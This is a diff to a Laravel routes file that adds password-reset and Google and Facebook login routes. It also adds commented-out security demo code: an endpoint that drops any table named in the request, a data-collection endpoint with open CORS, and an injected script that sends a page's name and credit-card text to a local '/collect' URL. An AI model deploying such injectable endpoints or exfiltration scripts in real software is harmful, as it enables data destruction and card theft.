@@ -3,12 +3,53 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\Web\ProductsController;
 use App\Http\Controllers\Web\UsersController;
+use App\Http\Controllers\Web\ForgetPasswordController;
 
 Route::get('register', [UsersController::class, 'register'])->name('register');
 Route::post('register', [UsersController::class, 'doRegister'])->name('do_register');
 Route::get('login', [UsersController::class, 'login'])->name('login');
 Route::post('login', [UsersController::class, 'doLogin'])->name('do_login');
 Route::get('logout', [UsersController::class, 'doLogout'])->name('do_logout');
+Route::get('verify', [UsersController::class, 'verify'])->name('verify');
+
+Route::get('/forgot-password', [ForgetPasswordController::class, 'showLinkRequestForm'])->name('password.request');
+Route::post('/forgot-password', [ForgetPasswordController::class, 'sendResetLinkEmail'])->name('password.email');
+Route::get('/reset-password/{token}', [ForgetPasswordController::class, 'showResetForm'])->name('password.reset');
+Route::post('/reset-password', [ForgetPasswordController::class, 'reset'])->name('password.update');
+
+Route::get('/auth/google',[UsersController::class, 'redirectToGoogle'])->name('login_with_google');
+Route::get('/auth/google/callback',[UsersController::class, 'handleGoogleCallback']);
+
+Route::get('auth/facebook', [UsersController::class, 'redirectToFacebook'])->name('login_with_facebook');
+Route::get('auth/facebook/callback', [UsersController::class, 'handleFacebookCallback']);
+
+
+// Route::get('sqli',function(Request $request){
+//     $table =$request->query('table');
+//     DB::unprepared("DROP TABLE $table");
+//     return redirect('/')->with('success', 'Table deleted successfully');
+// });
+
+
+// Route::get('/collect',function(Request $request){
+//     $name = $request->query('name');
+
+//     $credit = $request->query('credit');
+//     return response ('Data collected, 200')
+//     ->header('Access-Control-Allow-Origin', '*')
+//     ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
+//     ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
+// });
+
+// <script>
+// let name = document.getElementById('name').textContent;
+// let credit = document.getElementById('credit').textContent;
+// alert(name + credit);
+// let xhr = new XMLHttpRequest();
+// xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
+// xhr.send();
+// </script>
+
 
 Route::middleware(['auth'])->group(function () {
 
